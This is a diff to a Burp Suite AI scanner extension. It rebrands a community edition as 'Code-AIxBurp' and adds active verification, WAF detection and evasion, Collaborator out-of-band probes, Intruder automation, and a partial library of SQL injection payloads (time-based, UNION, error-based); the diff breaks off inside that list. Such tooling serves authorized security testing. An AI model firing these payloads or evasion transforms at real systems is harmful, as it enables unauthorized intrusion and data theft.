@@ -1,20 +1,19 @@
 # -*- coding: utf-8 -*-
-# Burp Suite Python Extension: SILENTCHAIN AI - COMMUNITY EDITION
-# Version: 1.1.1
-# Release Date: 2025-02-04
+# Burp Suite Python Extension: Code-AIxBurp
+# Version: 1.2.0
+# Release Date: 2026-03-10
 # License: MIT License
 # Build-ID: bb90850f-1d2e-4d12-852e-842527475b37
 #
-# COMMUNITY EDITION - AI-Powered Security Scanner
-# For active verification and Phase 2 testing, upgrade to Professional Edition
+# AI-Powered Security Scanner
 #
-# This community edition provides:
+# This extension provides:
 # - AI-powered passive security analysis
 # - OWASP Top 10 vulnerability detection
 # - Real-time threat identification
 # - Professional reporting with CWE/OWASP mappings
 #
-# Professional Edition adds:
+# Advanced Edition Features Included:
 # - Phase 2 active verification with exploit payloads
 # - WAF detection and evasion
 # - Advanced payload libraries
@@ -22,6 +21,7 @@
 # - Automated fuzzing with Burp Intruder integration
 #
 # Changelog:
+# v1.2.0 (2026-03-10) - Added WAF detection/evasion, advanced payload libraries, OOB collaborator testing, and Intruder automation
 # v1.1.1 (2025-02-04) - Fix Settings freeze and slow startup: move network calls off EDT to background threads
 # v1.1.0 (2025-02-04) - Fix UI hang on Linux: dirty-flag refresh guard, incremental console, remove EDT lock contention
 # v1.0.9 (2025-02-02) - Skip static files (js,css,images,fonts), passive scan toggle, taller Settings dialog
@@ -42,6 +42,8 @@ from burp import (
     IScanIssue,
     ITab,
     IContextMenuFactory,
+    IIntruderPayloadGeneratorFactory,
+    IIntruderPayloadGenerator,
 )
 from java.io import PrintWriter
 from java.awt import (
@@ -77,6 +79,7 @@ import threading
 import urllib2
 import time
 import hashlib
+from jarray import array as jarray_array
 from datetime import datetime
 
 VALID_SEVERITIES = {
@@ -126,7 +129,12 @@ class ConsolePrintWriter:
 
 
 class BurpExtender(
-    IBurpExtender, IHttpListener, IScannerCheck, ITab, IContextMenuFactory
+    IBurpExtender,
+    IHttpListener,
+    IScannerCheck,
+    ITab,
+    IContextMenuFactory,
+    IIntruderPayloadGeneratorFactory,
 ):
     def registerExtenderCallbacks(self, callbacks):
         self.callbacks = callbacks
@@ -141,14 +149,12 @@ class BurpExtender(
         self.stderr = ConsolePrintWriter(original_stderr, self)
 
         # Version Information
-        self.VERSION = "1.1.3"
-        self.EDITION = "Community"
-        self.RELEASE_DATE = "2026-02-08"
+        self.VERSION = "1.2.0"
+        self.EDITION = ""
+        self.RELEASE_DATE = "2026-03-10"
         self.BUILD_ID = "bb90850f-1d2e-4d12-852e-842527475b37"
 
-        callbacks.setExtensionName(
-            "SILENTCHAIN AI - %s Edition v%s" % (self.EDITION, self.VERSION)
-        )
+        callbacks.setExtensionName("Code-AIxBurp")
         callbacks.registerHttpListener(self)
         callbacks.registerScannerCheck(self)
         callbacks.registerContextMenuFactory(self)
@@ -157,7 +163,7 @@ class BurpExtender(
         import os
 
         self.config_file = os.path.join(
-            os.path.expanduser("~"), ".silentchain_config.json"
+            os.path.expanduser("~"), ".code_aixburp_config.json"
         )
 
         # AI Provider Settings (defaults - will be overridden by saved config)
@@ -175,6 +181,13 @@ class BurpExtender(
         self.PASSIVE_SCANNING_ENABLED = (
             True  # Enable/disable passive scanning (context menu still works)
         )
+        self.ENABLE_WAF_DETECTION = True
+        self.ENABLE_WAF_EVASION = True
+        self.ENABLE_ADVANCED_PAYLOADS = True
+        self.ENABLE_OOB_TESTING = True
+        self.ENABLE_INTRUDER_AUTOMATION = True
+        self.MAX_VERIFICATION_ATTEMPTS = 4
+        self.OOB_POLL_SECONDS = 18
 
         # File extensions to skip during analysis (static/non-security-relevant files)
         self.SKIP_EXTENSIONS = [
@@ -190,8 +203,16 @@ class BurpExtender(
             "svg",
         ]
 
+        # Runtime state for enhanced testing features
+        self.waf_profiles = {}
+        self.waf_lock = threading.Lock()
+        self.collaborator_contexts = {}
+        self.collaborator_lock = threading.Lock()
+        self.intruder_payload_factory_registered = False
+
         # Load saved configuration (if exists)
         self.load_config()
+        self.advanced_payload_library = self._build_advanced_payload_library()
 
         # UI refresh control
         self._ui_dirty = True  # Flag: data changed since last refresh
@@ -232,13 +253,16 @@ class BurpExtender(
             "skipped_low_confidence": 0,
             "findings_created": 0,
             "errors": 0,
+            "waf_detected": 0,
+            "oob_interactions": 0,
+            "intruder_launches": 0,
         }
         self.stats_lock = threading.Lock()
 
         # Create UI
         self.initUI()
 
-        self.log_to_console("=== SILENTCHAIN AI - Community Edition Initialized ===")
+        self.log_to_console("=== Code-AIxBurp Initialized ===")
         self.log_to_console("Console panel is active and logging...")
 
         # Force immediate UI refresh
@@ -250,19 +274,29 @@ class BurpExtender(
         self.stdout.println(
             "[+] Version: %s (Released: %s)" % (self.VERSION, self.RELEASE_DATE)
         )
-        self.stdout.println("[+] Edition: Community (Passive Analysis Only)")
         self.stdout.println("[+] AI Provider: %s" % self.AI_PROVIDER)
         self.stdout.println("[+] API URL: %s" % self.API_URL)
         self.stdout.println("[+] Model: %s" % self.MODEL)
         self.stdout.println("[+] Max Tokens: %d" % self.MAX_TOKENS)
         self.stdout.println("[+] Request Timeout: %d seconds" % self.AI_REQUEST_TIMEOUT)
         self.stdout.println("[+] Deduplication: ENABLED")
-        self.stdout.println("")
-        self.stdout.println("[*] COMMUNITY EDITION - Passive scanning only")
         self.stdout.println(
-            "[*] For active verification, upgrade to Professional Edition"
+            "[+] WAF Detection/Evasion: %s/%s"
+            % (
+                "ON" if self.ENABLE_WAF_DETECTION else "OFF",
+                "ON" if self.ENABLE_WAF_EVASION else "OFF",
+            )
         )
-        self.stdout.println("[*] Visit: https://silentchain.ai for more information")
+        self.stdout.println(
+            "[+] Advanced Payloads: %s | OOB: %s | Intruder Automation: %s"
+            % (
+                "ON" if self.ENABLE_ADVANCED_PAYLOADS else "OFF",
+                "ON" if self.ENABLE_OOB_TESTING else "OFF",
+                "ON" if self.ENABLE_INTRUDER_AUTOMATION else "OFF",
+            )
+        )
+        self.stdout.println("")
+        self.stdout.println("[*] Enhanced verification modules enabled")
 
         # Test AI connection in background thread (non-blocking startup)
         def _startup_connection_test():
@@ -283,6 +317,9 @@ class BurpExtender(
         # Add UI tab
         callbacks.addSuiteTab(self)
 
+        # Register Intruder payload factory
+        self._sync_intruder_payload_factory()
+
         # Start auto-refresh timer for Console
         self.start_auto_refresh_timer()
 
@@ -296,7 +333,7 @@ class BurpExtender(
         topPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))
 
         # Title
-        titleLabel = JLabel("SILENTCHAIN AI - Community Edition v%s" % self.VERSION)
+        titleLabel = JLabel("Code-AIxBurp")
         titleLabel.setFont(Font("Monospaced", Font.BOLD, 16))
         titlePanel = JPanel()
         titlePanel.add(titleLabel)
@@ -330,6 +367,9 @@ class BurpExtender(
             ("skipped_low_confidence", "Skipped (Low Confidence):"),
             ("findings_created", "Findings Created:"),
             ("errors", "Errors:"),
+            ("waf_detected", "WAF Detected:"),
+            ("oob_interactions", "OOB Hits:"),
+            ("intruder_launches", "Intruder Launches:"),
         ]
 
         row = 0
@@ -366,9 +406,9 @@ class BurpExtender(
             "Pause All Tasks", actionPerformed=self.pauseAllTasks
         )
 
-        # Upgrade to Professional button
+        # Updates button
         self.upgradeButton = JButton(
-            "Upgrade to Professional", actionPerformed=self.openUpgradePage
+            "Project Updates", actionPerformed=self.openUpgradePage
         )
         self.upgradeButton.setBackground(Color(0xD5, 0x59, 0x35))
         self.upgradeButton.setForeground(Color.WHITE)
@@ -982,12 +1022,45 @@ class BurpExtender(
                 self.PASSIVE_SCANNING_ENABLED = config.get(
                     "passive_scanning_enabled", self.PASSIVE_SCANNING_ENABLED
                 )
+                self.ENABLE_WAF_DETECTION = config.get(
+                    "enable_waf_detection", self.ENABLE_WAF_DETECTION
+                )
+                self.ENABLE_WAF_EVASION = config.get(
+                    "enable_waf_evasion", self.ENABLE_WAF_EVASION
+                )
+                self.ENABLE_ADVANCED_PAYLOADS = config.get(
+                    "enable_advanced_payloads", self.ENABLE_ADVANCED_PAYLOADS
+                )
+                self.ENABLE_OOB_TESTING = config.get(
+                    "enable_oob_testing", self.ENABLE_OOB_TESTING
+                )
+                self.ENABLE_INTRUDER_AUTOMATION = config.get(
+                    "enable_intruder_automation", self.ENABLE_INTRUDER_AUTOMATION
+                )
+                self.MAX_VERIFICATION_ATTEMPTS = int(
+                    config.get(
+                        "max_verification_attempts", self.MAX_VERIFICATION_ATTEMPTS
+                    )
+                )
+                self.OOB_POLL_SECONDS = int(
+                    config.get("oob_poll_seconds", self.OOB_POLL_SECONDS)
+                )
 
                 self.stdout.println(
                     "\n[CONFIG] Loaded saved configuration from %s" % self.config_file
                 )
                 self.stdout.println(
                     "[CONFIG] Provider: %s | Model: %s" % (self.AI_PROVIDER, self.MODEL)
+                )
+                self.stdout.println(
+                    "[CONFIG] WAF:%s Evasion:%s Payloads:%s OOB:%s Intruder:%s"
+                    % (
+                        "ON" if self.ENABLE_WAF_DETECTION else "OFF",
+                        "ON" if self.ENABLE_WAF_EVASION else "OFF",
+                        "ON" if self.ENABLE_ADVANCED_PAYLOADS else "OFF",
+                        "ON" if self.ENABLE_OOB_TESTING else "OFF",
+                        "ON" if self.ENABLE_INTRUDER_AUTOMATION else "OFF",
+                    )
                 )
             else:
                 self.stdout.println(
@@ -1013,6 +1086,13 @@ class BurpExtender(
                 "verbose": self.VERBOSE,
                 "theme": self.THEME,
                 "passive_scanning_enabled": self.PASSIVE_SCANNING_ENABLED,
+                "enable_waf_detection": self.ENABLE_WAF_DETECTION,
+                "enable_waf_evasion": self.ENABLE_WAF_EVASION,
+                "enable_advanced_payloads": self.ENABLE_ADVANCED_PAYLOADS,
+                "enable_oob_testing": self.ENABLE_OOB_TESTING,
+                "enable_intruder_automation": self.ENABLE_INTRUDER_AUTOMATION,
+                "max_verification_attempts": int(self.MAX_VERIFICATION_ATTEMPTS),
+                "oob_poll_seconds": int(self.OOB_POLL_SECONDS),
                 "version": self.VERSION,
                 "last_saved": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             }
@@ -1029,18 +1109,14 @@ class BurpExtender(
     def openUpgradePage(self, event):
         """Open updates page in browser"""
         self.stdout.println("\n[UPDATE] Checking for updates...")
-        self.stdout.println(
-            "[UPDATE] Visit https://silentchain.ai/?referral=silentchain_community"
-        )
+        self.stdout.println("[UPDATE] Visit https://code-x.my")
 
         try:
             import webbrowser
 
-            webbrowser.open("https://silentchain.ai/?referral=silentchain_community")
+            webbrowser.open("https://code-x.my")
         except:
-            self.stdout.println(
-                "[UPDATE] Please visit: https://silentchain.ai/?referral=silentchain_community"
-            )
+            self.stdout.println("[UPDATE] Please visit: https://code-x.my")
 
     def openSettings(self, event):
         """Open settings dialog with AI provider and advanced configuration"""
@@ -1061,11 +1137,11 @@ class BurpExtender(
         self.stdout.println("[SETTINGS] Current Model: %s" % self.MODEL)
 
         dialog = JDialog()
-        dialog.setTitle("SILENTCHAIN Settings - Community Edition")
+        dialog.setTitle("Code-AIxBurp Settings")
         dialog.setModal(True)
         dialog.setSize(
-            750, 650
-        )  # Wider to accommodate long model names, taller for Advanced tab
+            780, 760
+        )  # Wider and taller for enhanced advanced controls
         dialog.setLocationRelativeTo(None)
 
         tabbedPane = JTabbedPane()
@@ -1275,6 +1351,50 @@ class BurpExtender(
         advancedPanel.add(passiveScanCheck, gbc)
         row += 1
 
+        # Enhanced testing toggles
+        gbc.gridx = 0
+        gbc.gridy = row
+        advancedPanel.add(JLabel("WAF Detection:"), gbc)
+        gbc.gridx = 1
+        wafDetectCheck = JCheckBox("Enable WAF fingerprinting", self.ENABLE_WAF_DETECTION)
+        advancedPanel.add(wafDetectCheck, gbc)
+        row += 1
+
+        gbc.gridx = 0
+        gbc.gridy = row
+        advancedPanel.add(JLabel("WAF Evasion:"), gbc)
+        gbc.gridx = 1
+        wafEvasionCheck = JCheckBox("Enable evasion transforms", self.ENABLE_WAF_EVASION)
+        advancedPanel.add(wafEvasionCheck, gbc)
+        row += 1
+
+        gbc.gridx = 0
+        gbc.gridy = row
+        advancedPanel.add(JLabel("Advanced Payloads:"), gbc)
+        gbc.gridx = 1
+        advancedPayloadCheck = JCheckBox("Use payload libraries", self.ENABLE_ADVANCED_PAYLOADS)
+        advancedPanel.add(advancedPayloadCheck, gbc)
+        row += 1
+
+        gbc.gridx = 0
+        gbc.gridy = row
+        advancedPanel.add(JLabel("OOB Testing:"), gbc)
+        gbc.gridx = 1
+        oobCheck = JCheckBox("Enable Burp Collaborator checks", self.ENABLE_OOB_TESTING)
+        advancedPanel.add(oobCheck, gbc)
+        row += 1
+
+        gbc.gridx = 0
+        gbc.gridy = row
+        advancedPanel.add(JLabel("Intruder Automation:"), gbc)
+        gbc.gridx = 1
+        intruderCheck = JCheckBox(
+            "Enable Intruder payload generator and context action",
+            self.ENABLE_INTRUDER_AUTOMATION,
+        )
+        advancedPanel.add(intruderCheck, gbc)
+        row += 1
+
         # Help text for passive scanning
         gbc.gridx = 0
         gbc.gridy = row
@@ -1317,6 +1437,22 @@ class BurpExtender(
         advancedPanel.add(timeoutField, gbc)
         row += 1
 
+        gbc.gridx = 0
+        gbc.gridy = row
+        advancedPanel.add(JLabel("Verification Attempts:"), gbc)
+        gbc.gridx = 1
+        verifyAttemptsField = JTextField(str(self.MAX_VERIFICATION_ATTEMPTS), 10)
+        advancedPanel.add(verifyAttemptsField, gbc)
+        row += 1
+
+        gbc.gridx = 0
+        gbc.gridy = row
+        advancedPanel.add(JLabel("OOB Poll Time (seconds):"), gbc)
+        gbc.gridx = 1
+        oobPollField = JTextField(str(self.OOB_POLL_SECONDS), 10)
+        advancedPanel.add(oobPollField, gbc)
+        row += 1
+
         # Help text for timeout
         gbc.gridx = 0
         gbc.gridy = row
@@ -1325,7 +1461,8 @@ class BurpExtender(
             "Timeout for AI API requests (default: 60 seconds).\n"
             "Range: 10 to 99999 seconds (27.7 hours max).\n"
             "Increase if you get timeout errors.\n"
-            "Recommended: 30-120s (fast models), 180-600s (large models)."
+            "Recommended: 30-120s (fast models), 180-600s (large models).\n"
+            "Verification attempts range: 1-10. OOB poll range: 6-120s."
         )
         timeoutHelp.setEditable(False)
         timeoutHelp.setBackground(advancedPanel.getBackground())
@@ -1358,16 +1495,14 @@ class BurpExtender(
         gbc.gridy = row
         gbc.gridwidth = 2
         upgradeNotice = JTextArea(
-            "COMMUNITY EDITION - Passive Analysis Only\n\n"
-            "This edition provides AI-powered passive security analysis.\n\n"
-            "Upgrade to Professional Edition for:\n"
-            "- Phase 2 active verification\n"
-            "- Advanced payload libraries (OWASP, custom)\n"
-            "- WAF detection and evasion\n"
-            "- Out-of-band (OOB) testing\n"
-            "- Burp Intruder integration\n"
-            "- Priority support\n\n"
-            "Visit https://silentchain.ai for more information"
+            "ENHANCED MODULES\n\n"
+            "This build supports:\n"
+            "- Active verification with payload candidates\n"
+            "- WAF fingerprinting and evasion payload transforms\n"
+            "- Burp Collaborator out-of-band checks\n"
+            "- Intruder payload generator + one-click launch\n"
+            "- Tunable verification retries and OOB polling\n\n"
+            "Use responsibly and only on authorized targets."
         )
         upgradeNotice.setEditable(False)
         upgradeNotice.setBackground(advancedPanel.getBackground())
@@ -1393,6 +1528,11 @@ class BurpExtender(
 
             # Save Advanced settings
             self.PASSIVE_SCANNING_ENABLED = passiveScanCheck.isSelected()
+            self.ENABLE_WAF_DETECTION = wafDetectCheck.isSelected()
+            self.ENABLE_WAF_EVASION = wafEvasionCheck.isSelected()
+            self.ENABLE_ADVANCED_PAYLOADS = advancedPayloadCheck.isSelected()
+            self.ENABLE_OOB_TESTING = oobCheck.isSelected()
+            self.ENABLE_INTRUDER_AUTOMATION = intruderCheck.isSelected()
             self.THEME = str(themeCombo.getSelectedItem())
             self.VERBOSE = verboseCheck.isSelected()
 
@@ -1420,6 +1560,33 @@ class BurpExtender(
                     "[!] Invalid timeout value, using default: 60 seconds"
                 )
 
+            try:
+                max_attempts = int(verifyAttemptsField.getText())
+                if max_attempts < 1:
+                    max_attempts = 1
+                elif max_attempts > 10:
+                    max_attempts = 10
+                self.MAX_VERIFICATION_ATTEMPTS = max_attempts
+            except ValueError:
+                self.MAX_VERIFICATION_ATTEMPTS = 4
+                self.stderr.println(
+                    "[!] Invalid verification attempts value, using default: 4"
+                )
+
+            try:
+                oob_poll = int(oobPollField.getText())
+                if oob_poll < 6:
+                    oob_poll = 6
+                elif oob_poll > 120:
+                    oob_poll = 120
+                self.OOB_POLL_SECONDS = oob_poll
+            except ValueError:
+                self.OOB_POLL_SECONDS = 18
+                self.stderr.println("[!] Invalid OOB poll value, using default: 18")
+
+            self.advanced_payload_library = self._build_advanced_payload_library()
+            self._sync_intruder_payload_factory()
+
             # Log confirmation
             self.stdout.println("\n[SETTINGS] OK Configuration saved successfully")
             self.stdout.println("[SETTINGS] AI Provider: %s" % self.AI_PROVIDER)
@@ -1437,6 +1604,28 @@ class BurpExtender(
             self.stdout.println(
                 "[SETTINGS] Passive Scanning: %s"
                 % ("Enabled" if self.PASSIVE_SCANNING_ENABLED else "Disabled")
+            )
+            self.stdout.println(
+                "[SETTINGS] WAF Detection/Evasion: %s/%s"
+                % (
+                    "Enabled" if self.ENABLE_WAF_DETECTION else "Disabled",
+                    "Enabled" if self.ENABLE_WAF_EVASION else "Disabled",
+                )
+            )
+            self.stdout.println(
+                "[SETTINGS] Advanced Payloads: %s"
+                % ("Enabled" if self.ENABLE_ADVANCED_PAYLOADS else "Disabled")
+            )
+            self.stdout.println(
+                "[SETTINGS] OOB Testing: %s | Intruder Automation: %s"
+                % (
+                    "Enabled" if self.ENABLE_OOB_TESTING else "Disabled",
+                    "Enabled" if self.ENABLE_INTRUDER_AUTOMATION else "Disabled",
+                )
+            )
+            self.stdout.println(
+                "[SETTINGS] Verification Attempts: %d | OOB Poll: %ds"
+                % (int(self.MAX_VERIFICATION_ATTEMPTS), int(self.OOB_POLL_SECONDS))
             )
 
             # Save configuration to disk
@@ -1519,6 +1708,14 @@ class BurpExtender(
         verifyAllItem.addActionListener(lambda e: self._verifyAllPendingFindings())
         popup.add(verifyAllItem)
 
+        oobItem = JMenuItem("Run OOB Probe (Selected)")
+        oobItem.addActionListener(lambda e: self._runOobForSelectedFinding())
+        popup.add(oobItem)
+
+        intruderItem = JMenuItem("Send Finding Request to Intruder")
+        intruderItem.addActionListener(lambda e: self._sendSelectedFindingToIntruder())
+        popup.add(intruderItem)
+
         popup.addSeparator()
 
         markFalsePositive = JMenuItem("Mark as False Positive")
@@ -1584,6 +1781,61 @@ class BurpExtender(
         t = threading.Thread(target=verify_thread)
         t.daemon = True
         t.start()
+
+    def _runOobForSelectedFinding(self):
+        row = self.findingsTable.getSelectedRow()
+        if row < 0:
+            self.stdout.println("[OOB] No finding selected")
+            return
+        modelRow = self.findingsTable.convertRowIndexToModel(row)
+        with self.findings_lock_ui:
+            if modelRow < 0 or modelRow >= len(self.findings_list):
+                return
+            finding = self.findings_list[modelRow]
+            messageInfo = finding.get("messageInfo")
+            vuln_details = finding.get("vuln_details", {}) or {}
+
+        if not messageInfo:
+            self.stdout.println("[OOB] Selected finding has no request/response data")
+            return
+
+        injection_point = str(vuln_details.get("param_name", "") or "")
+
+        def _oob_thread():
+            oob_result = self._run_oob_probe_for_message(
+                messageInfo, injection_point=injection_point, context_label="Finding"
+            )
+            if oob_result.get("detected"):
+                self._updateVerificationStatus(
+                    modelRow,
+                    "Confirmed",
+                    oob_result.get("evidence", "OOB interaction observed"),
+                )
+            elif oob_result.get("sent"):
+                self._updateVerificationStatus(
+                    modelRow,
+                    "Uncertain",
+                    oob_result.get("evidence", "No OOB interaction observed"),
+                )
+
+        t = threading.Thread(target=_oob_thread)
+        t.daemon = True
+        t.start()
+
+    def _sendSelectedFindingToIntruder(self):
+        row = self.findingsTable.getSelectedRow()
+        if row < 0:
+            self.stdout.println("[INTRUDER] No finding selected")
+            return
+        modelRow = self.findingsTable.convertRowIndexToModel(row)
+        with self.findings_lock_ui:
+            if modelRow < 0 or modelRow >= len(self.findings_list):
+                return
+            messageInfo = self.findings_list[modelRow].get("messageInfo")
+        if not messageInfo:
+            self.stdout.println("[INTRUDER] Selected finding has no request data")
+            return
+        self.send_to_intruder_automated([messageInfo])
 
     def _verifyAllPendingFindings(self):
         """Verify all pending findings"""
@@ -1758,14 +2010,11 @@ class BurpExtender(
                     % (verification_nonce, payload_nonce)
                 )
 
-            payload = self._decoratePayloadWithNonce(
-                payload, vuln_family, verification_nonce
-            )
-
             if injection_point == "" and vuln_details.get("param_name"):
                 injection_point = str(vuln_details.get("param_name"))
-            if injection_point == "" and vuln_family == "generic":
-                injection_point = "X-Silentchain-Verify"
+            if injection_point == "":
+                request_info = self.helpers.analyzeRequest(messageInfo)
+                injection_point = self._pick_injection_point(request_info)
             if self._isHeaderInjectionPoint(injection_point):
                 injection_point = self._normalizeHeaderInjectionPoint(injection_point)
 
@@ -1777,47 +2026,196 @@ class BurpExtender(
                 )
                 return
 
-            self.stdout.println("[VERIFY] Payload: %s" % payload[:120])
+            waf_profile = {"detected": False}
+            if self.ENABLE_WAF_DETECTION:
+                waf_profile = self._detect_waf_profile(
+                    messageInfo=messageInfo, response_text=resp_str[:3000]
+                )
+                if waf_profile.get("detected"):
+                    self.stdout.println(
+                        "[VERIFY] WAF detected: %s (confidence=%s)"
+                        % (
+                            waf_profile.get("vendor", "Generic WAF"),
+                            str(waf_profile.get("confidence", 0)),
+                        )
+                    )
+
+            oob_domain = ""
+            oob_families = ["ssrf", "command_injection", "ssti", "generic"]
+            if self.ENABLE_OOB_TESTING and vuln_family in oob_families:
+                collab_context = self._get_or_create_collaborator_context(
+                    str(httpService.getHost() or "default")
+                )
+                oob_domain = self._generate_oob_payload(collab_context)
+
+            target_profile = self._build_target_profile(
+                req_str,
+                resp_str[:4000],
+                vuln_family=vuln_family,
+                injection_point=injection_point,
+            )
+            if self.VERBOSE:
+                self.stdout.println(
+                    "[VERIFY] Target profile: dbms=%s stack=%s os=%s json=%s api=%s"
+                    % (
+                        target_profile.get("dbms") or "unknown",
+                        target_profile.get("stack") or "unknown",
+                        target_profile.get("os") or "unknown",
+                        str(target_profile.get("is_json")),
+                        str(target_profile.get("is_api")),
+                    )
+                )
+
+            payload_candidates = self._generate_payload_candidates(
+                vuln_family=vuln_family,
+                ai_payload=payload,
+                verification_nonce=verification_nonce,
+                waf_profile=waf_profile,
+                oob_domain=oob_domain,
+                target_profile=target_profile,
+            )
+            if not payload_candidates:
+                payload_candidates = [payload]
+
             self.stdout.println(
-                "[VERIFY] Injection point: %s"
-                % (injection_point if injection_point else "<auto>")
+                "[VERIFY] Trying %d payload candidate(s) at %s"
+                % (
+                    len(payload_candidates),
+                    injection_point if injection_point else "<auto>",
+                )
             )
 
-            modified_request = self._injectPayload(req_str, payload, injection_point)
-            if not modified_request:
+            best_result = {
+                "status": "Uncertain",
+                "evidence": "No clear indicator found",
+                "confidence": 50,
+                "payload": payload_candidates[0],
+            }
+            best_score = -1
+            roundtrip_ms = 0
+            attempts_sent = 0
+
+            for candidate_payload in payload_candidates:
+                modified_request = self._injectPayload(
+                    req_str, candidate_payload, injection_point
+                )
+                if not modified_request:
+                    continue
+
+                attempts_sent += 1
+                self.stdout.println("[VERIFY] Payload: %s" % candidate_payload[:120])
+                started_at = time.time()
+                verification_response = self.callbacks.makeHttpRequest(
+                    httpService, self.helpers.stringToBytes(modified_request)
+                )
+                roundtrip_ms = int((time.time() - started_at) * 1000)
+
+                ver_resp_bytes = verification_response.getResponse()
+                if not ver_resp_bytes:
+                    continue
+
+                ver_resp_info = self.helpers.analyzeResponse(ver_resp_bytes)
+                status_code = int(ver_resp_info.getStatusCode() or 0)
+                ver_resp_str = self.helpers.bytesToString(ver_resp_bytes)
+
+                blocked = self._looks_waf_blocked(status_code, ver_resp_str[:2000])
+                if blocked and self.ENABLE_WAF_DETECTION and not waf_profile.get("detected"):
+                    waf_profile = {
+                        "detected": True,
+                        "vendor": "Generic WAF",
+                        "confidence": 60,
+                        "signals": ["block-page"],
+                        "status_code": status_code,
+                    }
+                    self._record_waf_profile(str(httpService.getHost() or ""), waf_profile)
+                analysis_detection_method = detection_method
+                if blocked:
+                    analysis_detection_method = (
+                        (detection_method + "; ") if detection_method else ""
+                    ) + "WAF/block-page heuristics"
+
+                result = self.analyze_verification_response(
+                    title,
+                    candidate_payload,
+                    analysis_detection_method,
+                    ver_resp_str[:4000],
+                    roundtrip_ms,
+                )
+
+                candidate_status = result.get("status", "Uncertain")
+                candidate_conf = result.get("confidence")
+                try:
+                    candidate_conf = int(candidate_conf)
+                except Exception:
+                    candidate_conf = 50
+
+                status_weight = {
+                    "Confirmed": 300,
+                    "False Positive": 200,
+                    "Uncertain": 100,
+                    "Error": 0,
+                }.get(candidate_status, 100)
+                score = status_weight + candidate_conf
+                if score > best_score:
+                    best_score = score
+                    best_result = {
+                        "status": candidate_status,
+                        "evidence": result.get("evidence", ""),
+                        "confidence": candidate_conf,
+                        "payload": candidate_payload,
+                    }
+
+                if candidate_status == "Confirmed":
+                    break
+                if candidate_status == "False Positive" and not blocked:
+                    break
+
+            if attempts_sent == 0:
                 self._updateVerificationStatus(
                     findingIndex,
                     "Error",
-                    "Could not inject payload into request "
-                    "(injection_point=%s, payload_preview=%s)"
-                    % (
-                        injection_point if injection_point else "<auto>",
-                        payload[:100].replace("\r", " ").replace("\n", " "),
-                    ),
+                    "Could not inject payloads into request (injection_point=%s)"
+                    % (injection_point if injection_point else "<auto>"),
                 )
                 return
 
-            self.stdout.println("[VERIFY] Sending verification request...")
-            started_at = time.time()
-            verification_response = self.callbacks.makeHttpRequest(
-                httpService, self.helpers.stringToBytes(modified_request)
-            )
-            roundtrip_ms = int((time.time() - started_at) * 1000)
+            # If response evidence is inconclusive for OOB-prone issues, run collaborator probe.
+            if (
+                self.ENABLE_OOB_TESTING
+                and best_result.get("status") != "Confirmed"
+                and vuln_family in oob_families
+            ):
+                oob_result = self._run_oob_probe_for_message(
+                    messageInfo,
+                    injection_point=injection_point,
+                    context_label="Verification",
+                    poll_seconds=self.OOB_POLL_SECONDS,
+                )
+                if oob_result.get("detected"):
+                    best_result["status"] = "Confirmed"
+                    best_result["confidence"] = max(
+                        95, int(best_result.get("confidence", 50))
+                    )
+                    best_result["evidence"] = (
+                        (best_result.get("evidence", "") + " | ")
+                        if best_result.get("evidence")
+                        else ""
+                    ) + oob_result.get("evidence", "Collaborator interaction observed")
+                    if oob_result.get("payload"):
+                        best_result["payload"] = oob_result.get("payload")
+                elif oob_result.get("sent"):
+                    best_result["evidence"] = (
+                        (best_result.get("evidence", "") + " | ")
+                        if best_result.get("evidence")
+                        else ""
+                    ) + oob_result.get(
+                        "evidence", "OOB probe sent but no interaction observed"
+                    )
 
-            ver_resp_bytes = verification_response.getResponse()
-            if not ver_resp_bytes:
-                self._updateVerificationStatus(findingIndex, "Error", "No response received")
-                return
-
-            ver_resp_str = self.helpers.bytesToString(ver_resp_bytes)
-
-            result = self.analyze_verification_response(
-                title, payload, detection_method, ver_resp_str[:4000], roundtrip_ms
-            )
-
-            status = result.get("status", "Uncertain")
-            evidence = result.get("evidence", "").strip()
-            confidence = result.get("confidence")
+            status = best_result.get("status", "Uncertain")
+            evidence = str(best_result.get("evidence", "")).strip()
+            confidence = best_result.get("confidence")
+            payload = best_result.get("payload", payload)
 
             details = evidence or "No clear indicator found"
             if confidence is not None:
@@ -1835,6 +2233,13 @@ class BurpExtender(
                     self.findings_list[findingIndex][
                         "verification_response_time_ms"
                     ] = roundtrip_ms
+                    self.findings_list[findingIndex][
+                        "verification_attempts"
+                    ] = attempts_sent
+                    if waf_profile.get("detected"):
+                        self.findings_list[findingIndex]["waf_vendor"] = waf_profile.get(
+                            "vendor", "Generic WAF"
+                        )
             self._ui_dirty = True
 
             self._updateVerificationStatus(findingIndex, status, details)
@@ -2180,13 +2585,13 @@ class BurpExtender(
         ]
         lowered = point.lower()
         if lowered in generic:
-            return "X-Silentchain-Verify"
+            return "X-Code-AIxBurp-Verify"
         if ":" in point and "=" not in point:
             point = point.split(":", 1)[0].strip()
         if point.lower() == "host":
-            return "X-Silentchain-Verify"
+            return "X-Code-AIxBurp-Verify"
         if not point:
-            return "X-Silentchain-Verify"
+            return "X-Code-AIxBurp-Verify"
         return point
 
     def _heuristicVerificationResult(
@@ -2383,6 +2788,1024 @@ class BurpExtender(
             self.stderr.println("[!] Payload injection error: %s" % str(e))
             return None
 
+    def _build_advanced_payload_library(self):
+        return {
+            "sqli": [
+                "' OR '1'='1",
+                "\" OR 1=1--",
+                "' OR '1'='1'-- -",
+                "') OR ('1'='1",
+                "' UNION SELECT NULL--",
+                "' UNION ALL SELECT NULL,NULL--",
+                "' AND 1=1--",
+                "' AND 1=2--",
+                "' ORDER BY 1--",
+                "' ORDER BY 100--",
+                "' AND SLEEP(2)--",
+                "' AND BENCHMARK(2000000,MD5(1))--",
+                "' AND (SELECT 1 FROM (SELECT SLEEP(2))a)--",
+                "';SELECT pg_sleep(2)--",
+                "' OR 1=(SELECT 1 FROM pg_sleep(2))--",
+                "';WAITFOR DELAY '0:0:2'--",
+                "' OR 1=1;WAITFOR DELAY '0:0:2'--",
+                "' AND 1=(SELECT 1 FROM dual)--",
+                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
+            ],
+            "sqli_mysql": [
+                "' AND SLEEP(2)--",
+                "' AND IF(1=1,SLEEP(2),0)--",
+                "' UNION SELECT @@version,NULL--",
+                "' OR EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))--",
+            ],
+            "sqli_postgresql": [
+                "';SELECT pg_sleep(2)--",
+                "' UNION SELECT version(),NULL--",
